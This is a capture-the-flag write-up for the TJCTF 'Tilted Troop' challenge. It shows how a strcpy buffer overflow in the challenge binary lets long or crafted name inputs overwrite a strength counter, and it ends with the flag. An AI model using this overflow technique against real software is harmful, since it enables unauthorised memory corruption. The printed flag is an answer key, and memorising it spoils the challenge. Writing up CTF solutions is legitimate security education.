# Tilted Troop
Binary Exploitation - 40 points

## Challenge 

Written by dwiz24

Can you help us defeat the monster? 

[binary](ec2a70a6fb4adde9dd9bc19319524cceffc821486345e4cfc670cd21f80193ed_strover) 
([source](48bd93cb48aab01658f26ef62da5507446f45445aaa83c902bfd9023c803be00_strover.c))

	nc problem1.tjctf.org 8002

## Solution


Looking at the source, the vulnerability is at this line

	strcpy(newMember, &input[2]);

Hence, we can make it such that the input name affects the strength

	$ nc problem1.tjctf.org 8002
	Commands:
	 A <name> - Add a team member
	 F - Fight the monster
	 Q - Quit
	A
	A
	A
	A
	A
	A
	A 
	A
	F
	Your team had 37 strength, but you needed exactly 400!
	AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
	F
	Your team had 585 strength, but you needed exactly 400!

Now by manipulating the name of the 9th person, we can control the strength

	...
	A a
	F
	Your team had 97 strength, but you needed exactly 400!

	...
	A 0   
	F
	Your team had 48 strength, but you needed exactly 400!

	...
	A 000
	F
	Your team had 144 strength, but you needed exactly 400!

---

After playing around, I got close to 400

	...
	A 00000000
	F
	Your team had 384 strength, but you needed exactly 400!

We are 16 strengths short, so looking at the ASCII table, let's change the first char 16 positions up from `0` to `@`.

	$ nc problem1.tjctf.org 8002
	Commands:
		 A <name> - Add a team member
		 F - Fight the monster
		 Q - Quit
	A  
	A
	A
	A
	A
	A
	A 
	A
	A @0000000
	F
	Wow! Your team is strong! Here, take this flag:
	tjctf{0oPs_CoMP4Ri5ONs_r_h4rD}

## Flag

	tjctf{0oPs_CoMP4Ri5ONs_r_h4rD}
